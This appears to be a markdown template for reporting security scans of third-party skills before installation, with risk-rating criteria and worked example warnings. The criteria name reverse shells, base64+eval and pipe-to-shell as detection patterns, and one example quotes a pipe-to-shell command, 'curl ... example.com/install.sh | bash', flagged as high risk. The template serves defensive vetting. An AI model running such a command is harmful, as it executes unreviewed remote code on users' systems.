# Security Scan Report Template

Use this template when presenting security scan results to the user.

---

## Security Scan Report — [skill-name]

**Source:** [repo/url]
**Scanned:** YYYY-MM-DD

### Scan Results

| # | Category | Severity | File:Line | Context |
|---|----------|----------|-----------|---------|
| | | | | |

### Risk Rating

| Rating | Criteria | This Skill |
|--------|----------|------------|
| Clean | 0 warnings | |
| Low | 1-2 warnings, none high-severity | |
| Medium | 3-5 warnings, or any destructive/system write | |
| High | Reverse shells, base64+eval combos, pipe-to-shell | |

### Warnings Detail

For each warning found, include:

```
⚠ [category] in [file]:[line]
   Pattern: [which security check triggered this]
   Context: [matched line content]
   Assessment: [is this likely malicious or benign?]
```

### Summary

- **Total warnings:** [N]
- **High severity:** [N]
- **Recommendation:** [install / install with caution / do not install]

### Scan Command Used

```bash
rg -n \
  -e '...' \
  -e '...' \
  ...
  .
```

---

## Example

```
⚠ Network exfiltration in scripts/fetch.py:12
   Pattern: curl to non-GitHub domain
   Context: curl -s https://pypi.org/pypi/package/json
   Assessment: Likely benign (package registry lookup). Review if needed.

⚠ Pipe to shell in install.sh:5
   Pattern: curl ... | bash
   Context: curl -s https://example.com/install.sh | bash
   Assessment: HIGH RISK. Downloads and executes remote code with no inspection.
   Recommendation: Do not install unless you trust the source and can verify the script.
```